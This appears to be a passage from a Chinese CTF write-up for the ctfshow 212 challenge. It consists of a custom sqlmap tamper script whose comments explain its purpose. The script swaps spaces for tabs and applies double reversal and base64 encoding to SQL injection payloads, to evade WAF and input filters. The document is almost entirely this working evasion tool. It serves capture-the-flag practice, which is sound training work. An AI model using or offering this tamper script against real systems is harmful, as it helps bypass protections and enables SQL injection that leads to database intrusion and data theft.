&lt;p&gt;&lt;strong&gt;自定义脚本 &lt;code&gt;ctfshow212sqlmap.py&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#!/usr/bin/env python
#ctfshow212 by AlgoZZi
#ctfshow212sqlmap.py

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ = PRIORITY.LOW

def dependencies():
    # 依赖加载时提示，仅显示一次
    singleTimeWarnMessage(&amp;quot;自定义 tamper 脚本已加载&amp;quot;)

def tamper(payload, **kwargs):
    &amp;quot;&amp;quot;&amp;quot;
    自定义 tamper 脚本
    功能说明：
        1. 通过 bypass() 函数，将 payload 中的空格替换为制表符 (TAB, chr(0x09))
           —— 常用于绕过对空格和 * 的过滤
        2. 对替换后的 payload 进行多层混淆处理：
            - 将 payload 转为字节串
            - 整体逆序一次
            - Base64 编码一次
            - 再次逆序
            - 再次 Base64 编码
            - 最终转回字符串输出
    用途：
        用于在 SQL 注入过程中，对 payload 进行特殊字符替换和多层编码，
        以绕过 WAF 或定制化的安全检测规则。
    &amp;quot;&amp;quot;&amp;quot;

    # 先替换空格为制表符
    payload = bypass(payload)

    retVal = payload
    # 转为字节串
    retVal = retVal.encode()
    # 第一次逆序
    retVal = retVal[::-1]
    # 第一次 Base64 编码
    retVal = base64.b64encode(retVal)
    # 第二次逆序
    retVal = retVal[::-1]
    # 第二次 Base64 编码
    retVal = base64.b64encode(retVal)
    # 转回字符串
    retVal = retVal.decode()

    return retVal


def bypass(payload):
    &amp;quot;&amp;quot;&amp;quot;
    bypass 函数
    功能：
        遍历 payload，每当遇到空格字符 &amp;quot; &amp;quot; 时，
        替换为 chr(0x09) —— 制表符 TAB
        其他字符保持不变。
    &amp;quot;&amp;quot;&amp;quot;

    retVal = &amp;quot;&amp;quot;
    for i in range(len(payload)):
        if payload[i] == &amp;quot; &amp;quot;:
            retVal += chr(0x09)
        else:
            retVal += payload[i]

    return retVal
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
